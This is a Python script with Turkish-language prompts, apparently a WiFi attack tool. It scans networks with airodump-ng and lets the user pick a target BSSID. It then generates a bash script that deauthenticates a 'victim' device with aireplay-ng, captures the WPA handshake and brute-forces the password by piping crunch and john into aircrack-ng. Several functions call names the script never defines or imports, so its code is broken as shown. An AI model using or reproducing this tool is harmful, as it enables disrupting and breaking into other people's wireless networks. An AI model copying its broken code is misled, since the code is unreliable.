#!/usr/bin/env python3
import os
import sys
import subprocess
import time
import signal

RESET  = "\033[0m"
RED    = "\033[1;91m"
GREEN  = "\033[1;32m"
BOLD   = "\033[1m"
YELLOW = "\033[1;33m"

def loading_animation():
    clear_screen()
    spinner = itertools.cycle(["|", "/", "-", "\\"])
    print(f"{WHITE_BOLD}Sistem baslatiliyor ", end="", flush=True)
    for _ in range(20):
        sys.stdout.write(next(spinner))
        sys.stdout.flush()
        time.sleep(0.15)
        sys.stdout.write("\b")
    print(f" {GREEN_BOLD}Hosgeldiniz{RESET}\n")
    time.sleep(1)
    clear_screen()

BANNER = RED + r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠤⠤⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡼⠟⠓⠒⠂⠀⢀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠀⠀⣐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡤⠖⠋⠁⠀⠀⠀⠀⠀⢀⠔⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣮⡅⠀⠀⠀⠀⢠⡁⠀⠀⠀⠀⠀⣠⣶⡼⠛⠁⠀⠀⠀⠀⠀⠀⠀⢀⡴⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣏⡀⠀⠀⠀⠘⠀⠀⠀⠀⠀⣦⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⢌⠁⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⠊⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⡀⠀⠀⠀⠀⣿⠀⠀⠎⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⠀⢀⣠⣧⣤⠤⠤⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠈⠻⣦⠀⠀⠀⢸⣧⠀⠁⠀⠀   ⢀⣿⠀⠀⠀⠀⣀⣤⡶⠚⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠘⣻⢀⠄⠀⠀⠀⢸⠇⢐⣆⡾⠟⠉⠀⠀⠀⠀⠀⠀⠀⢀⠔⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⣄⣾⠶⢆⣀⣀⣀⣿⣦⣤⣿⣟⣖⣜⣅⣰⢏⣠⢟⠉⠀⠀⠀⠀⠀⠀⠀⢀⠤⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢇⠜⠉⠒⣿⣿⡿⠟⢻⣿⣿⣿⣿⣿⣿⣜⣵⠟⠁⠀⠀⠀⠀⠀⠀⢀⠠⠠⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡪⠁⠀⠀⠀⣰⣿⣃⣤⣤⣾⣿⣿⣿⡿⢿⣿⣿⢿⠆⠀⠀⠀⠀⠀⠛⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡾⠁⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⢿⢳⣿⣿⠁⠈⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡏⣦⣿⡿⠁⠀⠀⠀⠱⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⣿⠟⢁⠀⠀⠀⠀⠀⠈⠣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⢿⣿⡟⠁⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⣻⠁⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠔⠁⠀⠀⠀⠀⠀⠀⠀⢠⠗⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


 ____  _____        _      ______            _        __                
|_   \|_   _|      / |_  .' ____ \          (_)      |  ]               
  |   \ | |  .---.`| |-' | (___ \_|_ .--.   __   .--.| | .---.  _ .--.  
  | |\ \| | / /__\\| |    _.____`.[ '/'`\ \[  |/ /'`\' |/ /__\\[ `/'`\] 
 _| |_\   |_| \__.,| |,  | \____) || \__/ | | || \__/  || \__., | |     
|_____|\____|'.__.'\__/   \______.'| ;.__/ [___]'.__.;__]'.__.'[___]    
                                  [__|                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

— The web is vast, but every thread can be traced.

""" + RESET

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def run_cmd(cmd, block=True):
    print(GREEN + f"[+] Calistiriliyor: {cmd}" + RESET + "\n")
    if block:
        subprocess.run(cmd, shell=True)
    else:
        return subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)

def stop_process(proc):
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except:
        pass

def scan_networks():
    print(BOLD + "[*] WIFI AGLARI TARAMASI BAŞLATILDI... (ENTER ILE DURDUR)" + RESET)
    proc = run_cmd("airodump-ng wlan0", block=False)
    input(BOLD + "\n[!] Devam etmek icin Enter'a basin..." + RESET)
    stop_process(proc)
    time.sleep(2)

def listen_target(BSSID, CH, CAPNAME):
    print(BOLD + f"[*] KURBAN DINLENIYOR: {BSSID} | Kanal: {CH}" + RESET)
    proc = run_cmd(f"airodump-ng wlan0 --bssid {BSSID} --channel {CH} --write {CAPNAME}", block=False)
    return proc

def launch_deauth_terminal(BSSID):
    script_content = f"""#!/usr/bin/env bash

echo -e "\\033[1;33m[*] Deauth terminali acildi.\\033[0m"
echo "Kurban cihaz MAC adresi:"
read VICTIM
echo "Gonderilecek paket sayisi (0 = tamamen banlar):"
read PKT

echo "[*] Deauth saldirisi basliyor..."
aireplay-ng --deauth $PKT -a {BSSID} -c $VICTIM wlan0

echo ""
echo "[*] Kurban cihazin baglanmasi icin vakit taniniyor..."
for i in $(seq 30 -1 1); do
    echo -ne "\\r[!] Kalan sure: $i sn "
    sleep 1
done
echo -e "\\n"

echo "Handshakeli .cap dosyasinin tam adini gir (örn: osman-01.cap):"
read CAPFILE

echo "[*] Handshake kontrolu basliyor..."
if aircrack-ng "$CAPFILE" 2>&1 | grep -q "1 handshake"; then
    echo "[+] BINGO!1! Bruteforce basliyor..."
    crunch 8 16 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | \\
    john --stdin --session=bifwifihack --stdout | \\
    aircrack-ng -w - -b {BSSID} "$CAPFILE"
else
    echo "[-] Handshake yok, bruteforce atlaniyor."
fi

echo "[*] Bu terminali kapatabilirsiniz."
read -p "[!] ENTER tuşuna basarak kapatin..."
"""
    script_path = "/tmp/deauth_script.sh"
    with open(script_path, "w") as f:
        f.write(script_content)
    os.chmod(script_path, 0o755)

    subprocess.Popen(["gnome-terminal", "--", script_path])

def handshake_only(BSSID, CAPNAME):
    script_content = f"""#!/usr/bin/env bash

echo "Handshakeli .cap dosyasinin tam adini gir (örn: {CAPNAME}-01.cap):"
read CAPFILE

echo "[*] Handshake kontrolu başlatiliyor..."
if aircrack-ng "$CAPFILE" 2>&1 | grep -q "1 handshake"; then
    echo "[+] BINGO!1! Bruteforce basliyor..."
    crunch 8 16 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | \\
    john --stdin --session=bifwifihack --stdout | \\
    aircrack-ng -w - -b {BSSID} "$CAPFILE"
else
    echo "[-] Handshake yok, bruteforce atlaniyor."
fi

echo "[*] Bu terminali kapatabilirsiniz."
read -p "[!] ENTER tuşuna basarak kapatin..."
"""
    script_path = "/tmp/handshake_only.sh"
    with open(script_path, "w") as f:
        f.write(script_content)
    os.chmod(script_path, 0o755)
    subprocess.Popen(["gnome-terminal", "--", script_path])

def main():
    clear()
    loading_animation()
    print(BANNER)
    time.sleep(3.5)

    print(BOLD + "[*] WiFi adaptor kontrol ediliyor..." + RESET + "\n")
    res = subprocess.run("iwconfig 2>/dev/null | grep wlan0", shell=True)
    if res.returncode != 0:
        print(RED + "[-] wlan0 adaptor bulunamadi!" + RESET)
        sys.exit(1)
    print(GREEN + "[+] wlan0 bulundu." + RESET + "\n")
    time.sleep(2)

    run_cmd("airmon-ng start wlan0")

    scan_networks()

    BSSID   = input(BOLD + "\nHEDEF BSSID: " + RESET)
    CH      = input(BOLD + "KANAL: " + RESET)
    CAPNAME = input(BOLD + ".cap DOSYASI ISIM(örn: capture): " + RESET)
    print("")

    same_net = input(BOLD + "Kurban cihazla ayni agda misiniz (e/h): " + RESET).lower()

    airodump_proc = listen_target(BSSID, CH, CAPNAME)

    if same_net == "e":
        print(YELLOW + "[*] Dinleme aktif, deauth terminali aciliyor..." + RESET)
        launch_deauth_terminal(BSSID)
        input(BOLD + "[!] Deauth islemi bittikten sonra ENTER'la kapatin..." + RESET)
    else:
        input(BOLD + "[!] Dinleme kapatmak icin ENTER'a basin (deauth yapilmayacak)..." + RESET)
        handshake_only(BSSID, CAPNAME)

    stop_process(airodump_proc)

    print(GREEN + "[*] Mon mod kapatiliyor..." + RESET)
    run_cmd("airmon-ng stop wlan0")
    print(GREEN + "[+] Islem tamamlandi" + RESET)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + RED + "[-] Islem durduruldu." + RESET)
        run_cmd("airmon-ng stop wlan0")
        sys.exit(0)
